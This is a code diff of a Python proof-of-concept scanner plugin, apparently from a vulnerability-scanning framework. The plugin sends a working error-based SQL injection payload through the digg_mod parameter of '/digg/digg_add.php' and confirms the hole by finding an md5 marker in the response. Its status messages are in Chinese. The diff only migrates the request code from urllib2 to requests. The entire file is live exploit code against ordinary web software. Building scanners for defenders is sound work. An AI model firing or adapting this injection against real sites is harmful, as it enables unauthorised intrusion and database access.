@@ -33,14 +33,13 @@ class Poc(ABPoc):
         try:
             self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                     target=self.target, vuln=self.vuln))
-            payload = ("/digg/digg_add.php?id=1&con=2&digg_mod=digg_data WHERE 1=2 +and(select 1 from("
-                       "select count(*),concat((select (select (select concat(0x7e,md5(3.1415),0x7e))) from "
-                       "information_schema.tables limit 0,1),floor(rand(0)*2))x from information_schema."
+            payload = ("/digg/digg_add.php?id=1&con=2&digg_mod=digg_data WHERE 1=2 +and(select 1 from("+
+                       "select count(*),concat((select (select (select concat(0x7e,md5(3.1415),0x7e))) from "+
+                       "information_schema.tables limit 0,1),floor(rand(0)*2))x from information_schema."+
                        "tables group by x)a)%23")
             verify_url = self.target + payload
-            req = urllib2.Request(verify_url)
-            content = urllib2.urlopen(req).read()
-            if '63e1f04640e83605c1d177544a5a0488' in content:
+            req = requests.get(verify_url)
+            if '63e1f04640e83605c1d177544a5a0488' in req.text:
                 self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                             target=self.target, name=self.vuln.name))
             
